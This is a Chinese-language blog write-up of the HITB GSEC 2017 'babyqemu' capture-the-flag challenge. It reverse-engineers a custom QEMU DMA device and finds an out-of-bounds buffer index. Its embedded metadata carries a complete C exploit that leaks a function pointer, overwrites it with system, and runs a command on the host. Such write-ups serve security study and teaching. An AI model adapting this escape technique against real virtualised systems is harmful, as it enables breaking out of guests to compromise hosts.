<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HITB GSEC 2017：babyqemu | hhdx's blog</title>
<meta name=keywords content="qemu,CTF"><meta name=description content="题目下载地址：babyqemu.tar.gz
分析
tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh


 1
 2
 3
 4
 5
 6
 7
 8
 9
10


#! /bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \     # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda


在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/babyqemu/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/babyqemu/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/babyqemu/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="HITB GSEC 2017：babyqemu"><meta property="og:description" content="题目下载地址：babyqemu.tar.gz
分析 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
1 2 3 4 5 6 7 8 9 10 #! /bin/sh ./qemu-system-x86_64 \ -initrd ./rootfs.cpio \ -kernel ./vmlinuz-4.8.0-52-generic \ -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \ -enable-kvm \ # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉 -monitor /dev/null \ -m 64M --nographic -L ./dependency/usr/local/share/qemu \ -L pc-bios \ -device hitb,id=vda 在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-11-30T12:05:03+00:00"><meta property="article:modified_time" content="2020-11-30T12:05:03+00:00"><meta property="article:tag" content="Qemu"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="HITB GSEC 2017：babyqemu"><meta name=twitter:description content="题目下载地址：babyqemu.tar.gz
分析
tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh


 1
 2
 3
 4
 5
 6
 7
 8
 9
10


#! /bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \     # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda


在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"HITB GSEC 2017：babyqemu","item":"https://hhdx.xyz/post/babyqemu/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HITB GSEC 2017：babyqemu","name":"HITB GSEC 2017：babyqemu","description":"题目下载地址：babyqemu.tar.gz\n分析 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh\n1 2 3 4 5 6 7 8 9 10 #! /bin/sh ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append \u0026#39;console=ttyS0 root=/dev/ram oops=panic panic=1\u0026#39; \\ -enable-kvm \\ # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉 -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id=vda 在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。\n","keywords":["qemu","CTF"],"articleBody":"题目下载地址：babyqemu.tar.gz\n分析 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh\n1 2 3 4 5 6 7 8 9 10 #! /bin/sh ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \\ -enable-kvm \\ # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉 -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id=vda 在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 00000000 HitbState struc ; (sizeof=0x1BD0, align=0x10, copyof_1495) 00000000 pdev PCIDevice_0 ? 000009F0 mmio MemoryRegion_0 ? 00000AF0 thread QemuThread_0 ? 00000AF8 thr_mutex QemuMutex_0 ? 00000B20 thr_cond QemuCond_0 ? 00000B50 stopping db ? 00000B51 db ? ; undefined 00000B52 db ? ; undefined 00000B53 db ? ; undefined 00000B54 addr4 dd ? 00000B58 fact dd ? 00000B5C status dd ? 00000B60 irq_status dd ? 00000B64 db ? ; undefined 00000B65 db ? ; undefined 00000B66 db ? ; undefined 00000B67 db ? ; undefined 00000B68 dma dma_state ? 00000B88 dma_timer QEMUTimer_0 ? 00000BB8 dma_buf db 4096 dup(?) 00001BB8 enc dq ? ; offset 00001BC0 dma_mask dq ? 00001BC8 db ? ; undefined 00001BC9 db ? ; undefined 00001BCA db ? ; undefined 00001BCB db ? ; undefined 00001BCC db ? ; undefined 00001BCD db ? ; undefined 00001BCE db ? ; undefined 00001BCF db ? ; undefined 00001BD0 HitbState ends 00001BD0 00000000 ; --------------------------------------------------------------------------- 00000000 00000000 dma_state struc ; (sizeof=0x20, align=0x8, copyof_1493) 00000000 ; XREF: HitbState/r 00000000 src dq ? 00000008 dst dq ? 00000010 cnt dq ? 00000018 cmd dq ? 00000020 dma_state ends 通过查看hitb_class_init函数找到vendor_id和device_id。在虚拟机里面查看具体信息。（这个busybox+kernel的虚拟机中的lspci指令比常规少一些选项，不像前一个题目STRNG中是一个完整的ubuntu发行版）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ lspci --help BusyBox v1.26.2 (2017-05-26 14:27:34 CST) multi-call binary. Usage: lspci [-mk] List all PCI devices -m\tParsable output -k\tShow driver $ lspci 00:00.0 Class 0600: 8086:1237 00:01.3 Class 0680: 8086:7113 00:03.0 Class 0200: 8086:100e 00:01.1 Class 0101: 8086:7010 00:02.0 Class 0300: 1234:1111 00:01.0 Class 0601: 8086:7000 00:04.0 Class 00ff: 1234:2333 $ cat /sys/devices/pci0000\\:00/0000\\:00\\:04.0/resource 0x00000000fea00000 0x00000000feafffff 0x0000000000040200 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 在pci_hitb_realize函数中观察到使用timer_init_tl初始化了一个timer时钟，和通过memory_region_init_io初始化了MMIO。\nMMIO的hitb_mmio_read函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size) { uint64_t result; // rax uint64_t val; // [rsp+0h] [rbp-20h] result = -1LL; if ( size == 4 ) { if ( addr == 0x80 ) return opaque-\u003edma.src; if ( addr \u003e 0x80 ) { if ( addr == 0x8C ) return *(dma_addr_t *)((char *)\u0026opaque-\u003edma.dst + 4); if ( addr \u003c= 0x8C ) { if ( addr == 0x84 ) return *(dma_addr_t *)((char *)\u0026opaque-\u003edma.src + 4); if ( addr == 0x88 ) return opaque-\u003edma.dst; } else { if ( addr == 0x90 ) return opaque-\u003edma.cnt; if ( addr == 0x98 ) return opaque-\u003edma.cmd; } } else { if ( addr == 8 ) { qemu_mutex_lock(\u0026opaque-\u003ethr_mutex); val = opaque-\u003efact; qemu_mutex_unlock(\u0026opaque-\u003ethr_mutex); return val; } if ( addr \u003c= 8 ) { result = 0x10000EDLL; if ( !addr ) return result; if ( addr == 4 ) return opaque-\u003eaddr4; } else { if ( addr == 0x20 ) return opaque-\u003estatus; if ( addr == 0x24 ) return opaque-\u003eirq_status; } } result = -1LL; } return result; } addr == 0x80 ——\u003e 读取dma.src addr == 0x84 ——\u003e 读取dma.src高地址处4字节 addr == 0x88 ——\u003e 读取dma.dst addr == 0x8c ——\u003e 读取dma.dst高地址处4字节 addr == 0x90 ——\u003e 读取dma.cnt addr == 0x98 ——\u003e 读取dma.cmd MMIO的hitb_mmio_write函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size) { uint32_t v4; // er13 int v5; // edx bool v6; // zf int64_t v7; // rax // !((size - 4) \u0026 0xFFFFFFFB) 等价于测试size第4bit是否为1并且低3bit是否为0 if ( (addr \u003e 0x7F || size == 4) \u0026\u0026 (!((size - 4) \u0026 0xFFFFFFFB) || addr \u003c= 0x7F) ) { if ( addr == 0x80 ) // 设置dma.src { if ( !(opaque-\u003edma.cmd \u0026 1) ) opaque-\u003edma.src = val; } else { v4 = val; if ( addr \u003e 0x80 ) { if ( addr == 0x8C ) { if ( !(opaque-\u003edma.cmd \u0026 1) ) *(dma_addr_t *)((char *)\u0026opaque-\u003edma.dst + 4) = val; } else if ( addr \u003e 0x8C ) { if ( addr == 0x90 ) // 设置dma.cnt { if ( !(opaque-\u003edma.cmd \u0026 1) ) opaque-\u003edma.cnt = val; } else if ( addr == 0x98 \u0026\u0026 val \u0026 1 \u0026\u0026 !(opaque-\u003edma.cmd \u0026 1) ) // 设置dma.cmd { opaque-\u003edma.cmd = val; v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0); timer_mod(\u0026opaque-\u003edma_timer, v7 / 1000000 + 100); } } else if ( addr == 0x84 ) { if ( !(opaque-\u003edma.cmd \u0026 1) ) *(dma_addr_t *)((char *)\u0026opaque-\u003edma.src + 4) = val; } else if ( addr == 0x88 \u0026\u0026 !(opaque-\u003edma.cmd \u0026 1) ) // 设置dma.dst { opaque-\u003edma.dst = val; } } else if ( addr == 32 ) { if ( val \u0026 0x80 ) _InterlockedOr((volatile signed __int32 *)\u0026opaque-\u003estatus, 0x80u); else _InterlockedAnd((volatile signed __int32 *)\u0026opaque-\u003estatus, 0xFFFFFF7F); } else if ( addr \u003e 0x20 ) { if ( addr == 96 ) { v6 = ((unsigned int)val | opaque-\u003eirq_status) == 0; opaque-\u003eirq_status |= val; if ( !v6 ) hitb_raise_irq(opaque, 0x60u); } else if ( addr == 100 ) { v5 = ~(_DWORD)val; v6 = (v5 \u0026 opaque-\u003eirq_status) == 0; opaque-\u003eirq_status \u0026= v5; if ( v6 \u0026\u0026 !msi_enabled(\u0026opaque-\u003epdev) ) pci_set_irq(\u0026opaque-\u003epdev, 0); } } else if ( addr == 4 ) { opaque-\u003eaddr4 = ~(_DWORD)val; } else if ( addr == 8 \u0026\u0026 !(opaque-\u003estatus \u0026 1) ) { qemu_mutex_lock(\u0026opaque-\u003ethr_mutex); opaque-\u003efact = v4; _InterlockedOr((volatile signed __int32 *)\u0026opaque-\u003estatus, 1u); qemu_cond_signal(\u0026opaque-\u003ethr_cond); qemu_mutex_unlock(\u0026opaque-\u003ethr_mutex); } } } } addr==0x80 \u0026\u0026 dma.cmd\u00261==0 —–\u003e 设置dma.src\naddr==0x84 \u0026\u0026 dma.cmd\u00261==0 —–\u003e 设置dma.src高地址处的4byte。\n（指向无定义空间，从上面dms_state的定义可以看出，其中的成员8字节对齐\naddr==0x88 \u0026\u0026 dma.cmd\u00261==0 —–\u003e 设置dma.dst\naddr==0x8c \u0026\u0026 dma.cmd\u00261==0 —–\u003e 同上\naddr==0x90 \u0026\u0026 dma.cmd\u00261==0 —–\u003e 设置dma.cnt\naddr==0x98 \u0026\u0026 dma.cmd\u00261==0 —–\u003e 设置dma.cmd，最低位需为1。同时timer_mod启动定时器，会触发hitb_dma_timer\nhitb_dma_timer函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 void __fastcall hitb_dma_timer(HitbState *opaque) { dma_addr_t cmd; // rax __int64 idx; // rdx uint8_t *addr; // rsi dma_addr_t v4; // rax dma_addr_t v5; // rdx char *v6; // rbp char *data; // rbp cmd = opaque-\u003edma.cmd; if ( cmd \u0026 1 ) { if ( cmd \u0026 2 ) { idx = (unsigned int)(LODWORD(opaque-\u003edma.src) - 0x40000); if ( cmd \u0026 4 ) { data = \u0026opaque-\u003edma_buf[idx]; opaque-\u003eenc(data, opaque-\u003edma.cnt); addr = (uint8_t *)data; } else { addr = (uint8_t *)\u0026opaque-\u003edma_buf[idx]; } cpu_physical_memory_rw(opaque-\u003edma.dst, addr, opaque-\u003edma.cnt, 1); v4 = opaque-\u003edma.cmd; v5 = opaque-\u003edma.cmd \u0026 4; } else { // 这里的反编译很崎岖，但是看反汇编还是可以看出来和读的操作是一致的 // 即：addr-0x40000作为idx，索引dma_buf v6 = \u0026opaque[0xFFFFFFDBLL].dma_buf[(unsigned int)opaque-\u003edma.dst + 0x510]; LODWORD(addr) = (_DWORD)opaque + opaque-\u003edma.dst - 0x40000 + 0xBB8; cpu_physical_memory_rw(opaque-\u003edma.src, (uint8_t *)v6, opaque-\u003edma.cnt, 0); v4 = opaque-\u003edma.cmd; v5 = opaque-\u003edma.cmd \u0026 4; if ( opaque-\u003edma.cmd \u0026 4 ) { addr = (uint8_t *)LODWORD(opaque-\u003edma.cnt); ((void (__fastcall *)(char *, uint8_t *, dma_addr_t))opaque-\u003eenc)(v6, addr, v5); v4 = opaque-\u003edma.cmd; v5 = opaque-\u003edma.cmd \u0026 4; } } opaque-\u003edma.cmd = v4 \u0026 0xFFFFFFFFFFFFFFFELL; // 把最低bit清掉了。又可以再次写入了 if ( v5 ) { opaque-\u003eirq_status |= 0x100u; hitb_raise_irq(opaque, (uint32_t)addr); } } } cmd的bit含义\nbit1 —–\u003e 是否为合规cmd（推测 bit2 —–\u003e dma.dst向dma.src拷贝，还是相反方向 bit3 —–\u003e 是否使用enc函数加密 cpu_physical_memory_rw函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // qemu-5.1.0/exec.c MemTxResult address_space_rw(AddressSpace *as, hwaddr addr, MemTxAttrs attrs, void *buf, hwaddr len, bool is_write) { if (is_write) { return address_space_write(as, addr, attrs, buf, len); } else { return address_space_read_full(as, addr, attrs, buf, len); } } void cpu_physical_memory_rw(hwaddr addr, void *buf, hwaddr len, bool is_write) { address_space_rw(\u0026address_space_memory, addr, MEMTXATTRS_UNSPECIFIED, buf, len, is_write); } is_write==1: 从buf读取len，写入物理地址addr。\nis_write==0: 从物理地址addr读取，写入buf。\n漏洞点 在DMA的read和write中存在越界。\nexploit 从HitbState可以看出，成员dma_buf后方紧跟enc函数指针。\n读取enc的函数地址，通过偏移得到system@plt.got的地址，写入到enc。\n写入cat flag字符串，使enc以这个字符串来调用。\nexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 #include #include #include #include #include #include #include #include #include #include #define PAGE_SHIFT 12 #define DMA_BASE 0x40000 uint8_t *iomem; uint8_t *dmabuf; uint64_t dmabuf_phys_addr; void die(const char *msg) { perror(msg); exit(-1); } uint64_t virt2phys(void *p) { uint64_t virt = (uint64_t)p; assert((virt\u00260xfff) == 0); int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd == -1) { die(\"open2\"); } uint64_t offset = virt \u003e\u003e (PAGE_SHIFT-3); lseek(fd, offset, SEEK_SET); uint64_t phys; if (read(fd, \u0026phys, 8) != 8) { die(\"read\"); } assert(phys \u0026 (1ULL \u003c\u003c 63)); phys = (phys \u0026 ((1ULL \u003c\u003c 54) - 1)) \u003c\u003c PAGE_SHIFT; return phys; } void iowrite(uint64_t addr, uint64_t value) { *((uint64_t *)(iomem + addr)) = value; } uint64_t ioread(uint64_t addr) { return *((uint64_t *)(iomem + addr)); } void dma_setsrc(uint32_t src) { iowrite(0x80, src); } void dma_setdst(uint32_t dst) { iowrite(0x88, dst); } void dma_setcnt(uint32_t cnt) { iowrite(0x90, cnt); } void dma_setcmd(uint32_t cmd) { iowrite(0x98, cmd); } void dma_read(uint64_t addr, size_t len) { dma_setsrc(addr); dma_setdst(dmabuf_phys_addr); dma_setcnt(len); dma_setcmd(0x3); sleep(1); } void dma_write(uint64_t addr, void *buf, size_t len) { memcpy(dmabuf, buf, len); dma_setsrc(dmabuf_phys_addr); dma_setdst(addr); dma_setcnt(len); dma_setcmd(0x1); sleep(1); } void dma_enc_read(uint64_t addr, size_t len) { dma_setsrc(addr); dma_setdst(dmabuf_phys_addr); dma_setcnt(len); dma_setcmd(0x7); sleep(1); } int main(int argc, char *argv[]) { int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource0\", O_RDWR|O_SYNC); if (fd == -1) { die(\"open\"); } iomem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); if (iomem == MAP_FAILED) { die(\"mmap\"); } printf(\"iomem @ %p\\n\", iomem); dmabuf = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0); if (dmabuf == MAP_FAILED) { die(\"mmap2\"); } // lock part or all of the calling process's virtual address space // into RAM, preventing that memory from being paged to the swap area. mlock(dmabuf, 0x1000); dmabuf_phys_addr = virt2phys(dmabuf); printf(\"dmabuff @ %p\\n\", dmabuf); printf(\"dmabuff(phys) @ %p\\n\", (void *)dmabuf_phys_addr); fflush(stdout); // leak hitb_enc address dma_read(DMA_BASE+0x1000, 8); uint64_t hitb_enc = *((uint64_t *)dmabuf); // calculate the system plt.got address uint64_t elf_base = hitb_enc - 0x283DD0; uint64_t system_pltgot = elf_base + 0x1FDB18; printf(\"system@plt.got @ 0x%lx\\n\", system_pltgot); dma_write(DMA_BASE+0x1000, \u0026system_pltgot, 8); char *payload = \"cat flag\"; dma_write(DMA_BASE+0x100, payload, strlen(payload)); dma_enc_read(DMA_BASE+0x100, 0x4); return 0; } 参考 HITB GSEC 2017: babyqemu [Sakura_University/外卡赛/HITB GSEC 2017 at master · tina2114/Sakura_University ](https://github.com/tina2114/Sakura_University/tree/master/外卡赛/HITB GSEC 2017) zhz师傅tql ","wordCount":"3101","inLanguage":"zh-cn","datePublished":"2020-11-30T12:05:03Z","dateModified":"2020-11-30T12:05:03Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/babyqemu/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">HITB GSEC 2017：babyqemu</h1><div class=post-meta><span title='2020-11-30 12:05:03 +0000 UTC'>November 30, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><p>题目下载地址：<a href=https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz>babyqemu.tar.gz</a></p><h2 id=分析>分析<a hidden class=anchor aria-hidden=true href=#分析>#</a></h2><p><code>tar xvzf babyqemu.tar.gz</code>解压看到启动脚本<code>launch.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#! /bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>./qemu-system-x86_64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-initrd ./rootfs.cpio <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-kernel ./vmlinuz-4.8.0-52-generic <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-append <span class=s1>&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-enable-kvm <span class=se>\ </span>    <span class=c1># 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉</span>
</span></span><span class=line><span class=cl>-monitor /dev/null <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-m 64M --nographic  -L ./dependency/usr/local/share/qemu <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-L pc-bios <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-device hitb,id<span class=o>=</span>vda
</span></span></code></pre></td></tr></table></div></div><p>在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到<code>HitbState</code>结构体，其中还包含<code>dma_state</code>结构体。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1495)
</span></span><span class=line><span class=cl>00000000 pdev            PCIDevice_0 ?
</span></span><span class=line><span class=cl>000009F0 mmio            MemoryRegion_0 ?
</span></span><span class=line><span class=cl>00000AF0 thread          QemuThread_0 ?
</span></span><span class=line><span class=cl>00000AF8 thr_mutex       QemuMutex_0 ?
</span></span><span class=line><span class=cl>00000B20 thr_cond        QemuCond_0 ?
</span></span><span class=line><span class=cl>00000B50 stopping        db ?
</span></span><span class=line><span class=cl>00000B51                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B52                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B53                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B54 addr4           dd ?
</span></span><span class=line><span class=cl>00000B58 fact            dd ?
</span></span><span class=line><span class=cl>00000B5C status          dd ?
</span></span><span class=line><span class=cl>00000B60 irq_status      dd ?
</span></span><span class=line><span class=cl>00000B64                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B65                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B66                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B67                 db ? ; undefined
</span></span><span class=line><span class=cl>00000B68 dma             dma_state ?
</span></span><span class=line><span class=cl>00000B88 dma_timer       QEMUTimer_0 ?
</span></span><span class=line><span class=cl>00000BB8 dma_buf         db 4096 dup(?)
</span></span><span class=line><span class=cl>00001BB8 enc             dq ?                    ; offset
</span></span><span class=line><span class=cl>00001BC0 dma_mask        dq ?
</span></span><span class=line><span class=cl>00001BC8                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BC9                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BCA                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BCB                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BCC                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BCD                 db ? ; undefined
